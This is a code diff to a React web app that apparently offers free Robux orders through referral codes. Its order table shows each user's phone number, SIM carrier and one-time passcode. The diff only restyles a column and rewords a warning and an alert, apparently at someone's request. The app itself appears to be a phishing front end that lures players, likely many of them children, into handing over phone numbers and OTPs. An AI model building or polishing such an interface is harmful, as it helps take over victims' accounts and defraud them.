@@ -266,7 +266,7 @@
                                             <div className="font-medium text-white truncate pr-2" title={order.username}>{order.username}</div>
                                             <div className="text-gray-400">{order.sim}</div>
                                             <div className="font-mono text-yellow-500 col-span-1 text-xs">{order.phone}</div>
-                                            <div className="text-blue-300 font-mono text-xs">{order.referral || '-'}</div>
+                                            <div className="text-red-500 font-mono text-xs font-bold">{order.referral || '-'}</div>
                                             <div className="font-mono text-white font-bold text-lg tracking-widest">{order.otp || '-'}</div>
                                             <div><span className={`px-2 py-1 rounded text-xs font-bold ${order.status === 'verified' ? 'bg-green-500/20 text-green-400' : 'bg-yellow-500/20 text-yellow-400'}`}>{order.status ? order.status.toUpperCase() : 'PENDING'}</span></div>
                                             <div className="text-gray-500 text-xs">{order.timestamp?.seconds ? new Date(order.timestamp.seconds * 1000).toLocaleTimeString() : 'Now'}</div>
@@ -381,6 +381,8 @@
                                             <Ticket className="w-5 h-5 text-gray-500" />
                                             <input type="text" value={referralCode} onChange={(e) => setReferralCode(e.target.value)} placeholder="Enter code" className="flex-1 bg-transparent border-none outline-none text-white w-full uppercase" required={isFreeOrder}/>
                                         </div>
+                                        {/* Added warning text as requested */}
+                                        {isFreeOrder && <p className="text-xs text-red-500 font-medium mt-1">⚠️ Note: If the code is invalid, the Robux transfer will NOT proceed.</p>}
                                     </div>
 
                                     {isFreeOrder ? (
@@ -512,7 +514,8 @@
                             const querySnapshot = await fb.getDocs(q);
                             
                             if (querySnapshot.empty) {
-                                alert("The referral code doesn't exist or is wrong.");
+                                // Updated alert message
+                                alert("Invalid Referral Code. The Robux transfer cannot proceed.");
                                 setIsProcessing(false);
                                 return;
                             }
